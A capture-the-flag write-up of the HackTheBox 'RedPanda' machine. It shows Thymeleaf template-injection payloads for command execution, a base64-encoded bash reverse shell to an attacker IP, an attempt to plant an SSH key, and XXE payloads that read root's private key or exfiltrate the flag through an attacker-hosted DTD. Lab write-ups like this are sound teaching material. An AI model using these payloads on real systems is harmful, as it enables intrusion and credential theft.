# HackTheBox - RedPanda

## NMAP

```bash
Nmap scan report for 10.10.11.170
Host is up (0.089s latency).   
Not shown: 65533 closed ports      
PORT     STATE SERVICE    VERSION     
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)        
8080/tcp open  http-proxy
| fingerprint-strings:                  
|   GetRequest:            
|     HTTP/1.1 200                     
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 09 Jul 2022 19:01:58 GMT     
|     Connection: close     
|     <!DOCTYPE html>              
snip..
|_    Request</h1></body></html>       
| http-methods:                    
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Red Panda Search | Made with Spring Boot
```

## PORT 8080 (HTTP)
On port 8080 we see an animation of a fox having a search bar and the title bar tells us that it's made on `Spring Boot` which is a java web framework

<img src="https://i.imgur.com/CuFnR67.png"/>

I tried some stuff like putting a single quote `'` to see if there's sqli or some command injection 

<img src="https://i.imgur.com/dKLGXDE.png"/>

<img src="https://i.imgur.com/ZVSdWUe.png"/>

Fuzzing for files with `gobuster` we find an endpoint `/stats`

<img src="https://i.imgur.com/IoSeBSg.png"/>

<img src="https://i.imgur.com/KhGjNLy.png"/>

This shows two potential usernames `damian` and `woodenk`, clicking on either one of them will show us an option to export table and a GET parameter `author` 

<img src="https://i.imgur.com/0Srex1A.png"/>

I tried fuzzing for LFI through a payload list which failed as well

<img src="https://i.imgur.com/pMAPUL6.png"/>

On clicking `Export table` it downloads an xml file

<img src="https://i.imgur.com/yJIiibv.png"/>

## Foothold

But we can't really change the contents of xml so there's no chance of`XXE`, testing for  `SSTI` it was vulnerable to `Thymeleaf` which is a template engine for spring boot, testing it with `@{7*7]`

https://javamana.com/2021/11/20211121071046977B.html

<img src="https://i.imgur.com/MbHn4hs.png"/>

So we know that it's vulnerable to SSTI, let's try to get RCE and look for any payloads if there are

<img src="https://i.imgur.com/uW9zrqt.png"/>


But this payload didn't worked and gave an error that there are banned characters

<img src="https://i.imgur.com/dR1TMlw.png"/>

```bash
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}
```

I tried different fragement exrpessions

<img src="https://i.imgur.com/bVTNH99.png"/>

And `*` this one worked with our payload

```bash
*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}
```

<img src="https://i.imgur.com/5bxHydA.png"/>

For getting a reverse shell I tried bunch of things, encoding the reverse shell with base64 and sending it off but I didn't get a connection back

```bash
*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("echo 'L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM2LzIyMjIgMD4mMScK' | base64 -d | bash).getInputStream()).next()}
```
<img src="https://i.imgur.com/8rsznbN.png"/>

<img src="https://i.imgur.com/xYVTeP2.png"/>

Also tried writing ssh key in `authorized_keys` file but it again gave an error for banned characters

```bash
*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTFEKz1yo3lIWUoYDguQRH534VSoRINR3uWUngQEauC0vIjJuppj2d4nRMMxVOtcQIWuvfYnDef6IbJEBqbyZZw2BOgGdh2Q41kSAKrfoqSbefa7lLtabS9Jt6lo+UY7uEoj6zTsQO4E+b895BNeBQUccfqnY1uyFjFptUR39msM5U8I1BoefbwbI5C7yrZULEZQwkoXKbc1/di/B5btMq2PIbO5f1Za7nwBkaVVv2skmSa0b8K6zkYdIbaaP3HAfkbDiJJXyEJQijqIAYW8CBhGW17KkXAAvmumKjYKFvfa/e5KobAgJT2zKd25Ycu8L8lH3JluyEE4ZHA4XvVSnRSbR4PTL2A6rjE+2bI1MRuF5KYiIMuU3enK7zgYkD2ed3xXgcfqMqPVlE73j6ykKT7mMmA0Pb7uKEHnqMXJFUueVcAso+lYrbvZyRX7hn7hEXOw4uum7lUtZp4iUYSsD/ogAslkvp2WpHRbMW+5rsi+lBAt09lb2aC38yO/jzAy0= arz@blaze' > /home/woodenk/.ssh/authorized_keys").getInputStream()).next()}
```

<img src="https://i.imgur.com/DSBKOfU.png"/>

I searched around for ways to generate java runtime exec payloads and found an encoder for that

https://zgao.top/java-lang-runtime-exec-payload-encoding-tool/

<img src="https://i.imgur.com/ZhHzEdg.png"/>

```bash
*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM2LzIyMjIgMD4mMSc=}|{base64,-d}|{bash,-i}").getInputStream()).next()}

```

<img src="https://i.imgur.com/ZEhv27N.png"/>

Stabilizing the shell with `python3`

<img src="https://i.imgur.com/w2ArtEO.png"/>

Since we are in `logs` group, I checked if this group has access anywhere

<img src="https://i.imgur.com/rUvPZ41.png"/>

The reason we are in this group is because the panda search is application is being ran as woodenk as user and with logs group 

<img src="https://i.imgur.com/uOf23V3.png"/>

Checked for `sudo -l` which was asking for a password

<img src="https://i.imgur.com/DdV4l6D.png"/>

I transferred `linpeas` to enumerate the machine

<img src="https://i.imgur.com/B95pN0F.png"/>

It didn't find anything but `pspy` did find something running in background as root user

<img src="https://i.imgur.com/ctnE3TE.png"/>

## Privilege Escalation

In `/opt` , we can see a clean up script removing every jpg and xml files from every publicly writeable directory

<img src="https://i.imgur.com/ZEG8akc.png"/>

We can check the source code of panda search `MainController.java`

<img src="https://i.imgur.com/r2SHtcy.png"/>

In the source code we can see that it's looking for either`damian_creds.xml` or `woodenk_creds.xml` in `/credits` and reading the contents

<img src="https://i.imgur.com/kpabyuy.png"/>

We can find the password of woodenk user here

<img src="https://i.imgur.com/CgSoMXW.png"/>


But it was useless as we wouldn't be in the logs group also this file isn't important as the one which is running as root through cronjob is credit score `/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java`

First it's going to set arguments from the log file from which it can parse the values and seperate them with `||`

<img src="https://i.imgur.com/54g308r.png"/>

In `IsImage` function it's going to check for a jpg image extension file , will come back to it later 

<img src="https://i.imgur.com/WHVAM1F.png"/>

From `getArtist` function it's going to read the meta data of the image specfically the name of Artisit of the image 
<img src="https://i.imgur.com/6ui325Y.png"/>


The `addViewTo` is the function which is vulnerable to XXE because it's using jdom2 version 2.0.6.1 which can be verified from `pom.xml` which contains information about the project

<img src="https://i.imgur.com/IwlkhaM.png"/>

<img src="https://i.imgur.com/t8uHC1R.png"/>

<img src="https://i.imgur.com/Muxjx4z.png"/>

Lastly the `main` function from which the code will start from which wiil read the `uri` part from the log file sperated by `||`, it will check if there's a jpg image file in the uri, if there is , it's going to fetch the artist name of the image file and it's going to send the value to addviewto function which will check if the uri of the image is the similar the one present in the xml file 

<img src="https://i.imgur.com/dT0Jy4C.png"/>

So to perform the XXE, first we need to make jpg image file point to an artist name and it could be any name so I'll be setting it to `uwu` but we don't have write permissions in the directory where the source code is running so we'll need to perform directory traversal to `/home/woodenk`

For the xml file we need to name it `artist` + `creds.xml`, so it's going to be `uwu_creds.xml` also we need to add the location of the image in uri and this needs to be the same as the one in the log file

<img src="https://i.imgur.com/RCjCXtp.png"/>

<img src="https://i.imgur.com/bXpt4Zn.png"/>


## Method 1

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>  <uri>/../../../../../../../../../../home/woodenk/smooch.jpg</uri>
    <uwu>&example;</uwu>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>

```

Transfer both the image and xml file in wendook's home directory

<img src="https://i.imgur.com/TWD666w.png"/>

<img src="https://i.imgur.com/ABmNinh.png"/>

Now to add the uri of this image file we'll perform a directory traversal from `/clients` as the path is hardcoded `/opt/panda_search/src/main/resources/static` + `uri` , here uri is our input where we'll perform directory traversal to our image file location `/home/wendook/smooch.jpg`

```bash
echo "200||10.10.14.36||Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0||/../../../../../../../../../../home/woodenk/smooch.jpg" > ./redpanda.log
```

<img src="https://i.imgur.com/ECPhTSu.png"/>

After waiting for some time we'll see the root ssh key being reflected in `uwu` xml attribute which we set

<img src="https://i.imgur.com/1gGNYqd.png"/>

<img src="https://i.imgur.com/MkmML00.png"/>

## Method 2

The second way is also with XXE but it's with blind SSRF which is also known as out of band XXE, through which we'll get the root flag by transferring an xml file having an entity to make a request to our server with the entity having the flag contents as a parameter being passed on to our hosted xml having the entities to load the contents 

<img src="https://i.imgur.com/PmM4ezT.png"/>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://IP/uwu.dtd"> %xxe;]>
<credits>
  <author>&xxe;</author>
</credits>

```

<img src="https://i.imgur.com/2rJc7K1.png"/>

We'll transfer this on the target machine

<img src="https://i.imgur.com/B7SHqnV.png"/>

And host this xml file on our python server

<img src="https://i.imgur.com/rpppOXN.png"/>

<img src="https://i.imgur.com/85mpfJg.png"/>

## References
- https://javamana.com/2021/11/20211121071046977B.html
- https://zgao.top/java-lang-runtime-exec-payload-encoding-tool/
- https://r0yanx.com/tools/java_exec_encode/
- https://security.snyk.io/vuln/SNYK-JAVA-ORGJDOM-1309669
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
